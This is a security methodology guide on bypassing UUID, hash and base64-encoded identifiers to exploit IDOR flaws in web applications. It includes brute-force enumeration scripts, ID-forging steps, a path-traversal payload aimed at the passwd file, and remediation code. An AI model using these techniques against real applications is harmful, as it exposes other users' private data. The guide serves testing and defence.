# UUID and Encoded Identifier Bypass Techniques

## Attack Description
Developers often believe using UUIDs or encoded identifiers prevents IDOR attacks. This is a dangerous misconception. While non-sequential identifiers reduce enumeration risk, they do NOT replace authorization checks. This methodology covers techniques to bypass "security through obscurity" identifier schemes.

## The UUID Misconception

**False belief**: "UUIDs are unguessable, so IDOR is impossible"

**Reality**: 
- UUIDs may leak elsewhere in the application
- Some UUID versions are predictable (v1 uses timestamp)
- Encoding is NOT encryption — it's reversible
- Authorization is STILL the fundamental requirement

## Techniques for UUID/Encoded IDOR

### 1. UUID Leakage Discovery
Look for UUID exposure in:

```javascript
// Public API responses
GET /api/posts
{
  "posts": [
    {"id": "550e8400-e29b-41d4-a716-446655440000", "author_uuid": "7c9e6679-7425-40de-944b-e07fc1f90ae7"}
  ]
}

// HTML source code
<div data-user-id="7c9e6679-7425-40de-944b-e07fc1f90ae7">

// JavaScript files
const API_BASE = "/api/v1/users/550e8400-...";

// URL parameters on public pages
/profile?user=7c9e6679-7425-40de-944b-e07fc1f90ae7

// Email links
Click here: https://app.example.com/verify/550e8400-e29b-41d4-a716-446655440000

// WebSocket messages
{"type": "presence", "user_id": "7c9e6679-..."}
```

### 2. Encoded Identifier Decoding

**Base64 Encoding**
```bash
# Encoded ID in URL
/document?id=ZTRkYTNiN2ZiYmNlMjM0NWQ3NzcyYjA2NzRhMzE4ZDU=

# Decode
echo "ZTRkYTNiN2ZiYmNlMjM0NWQ3NzcyYjA2NzRhMzE4ZDU=" | base64 -d
# Output: e4da3b7fbbce2345d7772b0674a318d5

# This is an MD5 hash! Crack it:
hashcat -m 0 e4da3b7fbbce2345d7772b0674a318d5 wordlist.txt
```

**Hex Encoding**
```bash
# Hex-encoded user ID
/api/user/3132333435  # "12345" in hex
echo "3132333435" | xxd -r -p
# Output: 12345
```

**URL Encoding**
```
/file?name=%2e%2e%2f%2e%2e%2fpasswd
# Decodes to: ../../passwd
```

**JSON in Base64**
```bash
# JWT-style encoded parameter
/api/resource/eyJ1c2VyX2lkIjoxMjM0NX0=
base64 -d <<< "eyJ1c2VyX2lkIjoxMjM0NX0="
# Output: {"user_id":12345}

# Modify and re-encode
echo '{"user_id":99999}' | base64
# Output: eyJ1c2VyX2lkIjo5OTk5OX0K
```

### 3. Hash Pattern Discovery

**MD5 Hashed IDs**
```python
import hashlib

# If you suspect IDs are MD5(sequential_number):
for i in range(1, 1000):
    h = hashlib.md5(str(i).encode()).hexdigest()
    response = requests.get(f"/document?id={h}")
    if response.status_code == 200:
        print(f"[IDOR] ID {i} = hash {h}")
```

**SHA1/SHA256 Hashed IDs**
Same principle — brute force the original values if they're predictable.

### 4. UUID Version Exploitation

**UUIDv1 (Timestamp-based)**
```python
import uuid

# UUIDv1 contains timestamp + MAC address
u = uuid.UUID("550e8400-e29b-11d4-a716-446655440000")
# Extract timestamp: datetime.fromtimestamp(u.time / 1e7 - 12219292800)

# If you know approximate creation time, generate candidate UUIDs
# around that timestamp
```

**UUIDv4 (Random)**
Truly random — not predictable, but still may leak elsewhere.

### 5. GUID Collision/Brute Force

For shorter "random" identifiers (6-8 chars):
```python
import string
import itertools

# Brute force short alphanumeric codes
chars = string.ascii_lowercase + string.digits
for combo in itertools.product(chars, repeat=6):
    code = ''.join(combo)
    response = requests.get(f"/share/{code}")
    if response.status_code == 200:
        print(f"[IDOR] Valid share code: {code}")
```

## Exploitation Steps

### Step 1: Identify Encoding Scheme
```
1. Capture identifier from legitimate request
2. Check length and character set:
   - 32 hex chars = MD5/UUID without dashes
   - 36 chars with dashes = UUID
   - Ends with = = Base64
   - Mix of letters/numbers/underscores = Custom encoding
3. Attempt common decodings (base64, hex, URL decode)
```

### Step 2: Find Leakage Points
```
1. Search all public pages for identifier patterns
2. Check API responses for cross-references
3. Examine JavaScript bundles for hardcoded IDs
4. Monitor WebSocket traffic for leaked identifiers
5. Check email notifications for direct links
6. Inspect mobile app traffic for UUID exposure
```

### Step 3: Cross-Reference Attack
```
1. User A posts something public
2. API response includes User A's UUID
3. Use that UUID to access User A's private data:
   GET /api/user/{User_A_UUID}/private-messages
```

## Detection Method
- Examine identifier format — is it truly random?
- Search codebase for identifier generation logic
- Check if authorization validates ownership, not just identifier validity
- Test cross-account access even with "unguessable" IDs

## Remediation
```python
# STILL VULNERABLE (uses UUID but no auth check)
def get_document(doc_uuid):
    return db.query("SELECT * FROM docs WHERE uuid = ?", doc_uuid)

# SECURE (validates ownership regardless of identifier type)
def get_document(doc_uuid, current_user):
    doc = db.query("SELECT * FROM docs WHERE uuid = ?", doc_uuid)
    if doc.owner_id != current_user.id and not doc.is_public:
        raise UnauthorizedException()
    return doc
```

## Real Examples

### HackerOne - Report Disclosure via UUID
Private report UUIDs leaked in notifications allowed unauthorized access.

### Shopify - Order UUID Leakage
Order UUIDs exposed in webhook payloads enabled customer data theft.

### Reddit - Modlog UUID IDOR ($5,000)
UUIDs for mod actions leaked, allowing access to restricted subreddit logs.
- https://hackerone.com/reports/1658418

## Key Insight
**UUIDs prevent enumeration, not authorization bypass.** 
Any leaked UUID becomes an attack vector. Always implement proper ownership checks.
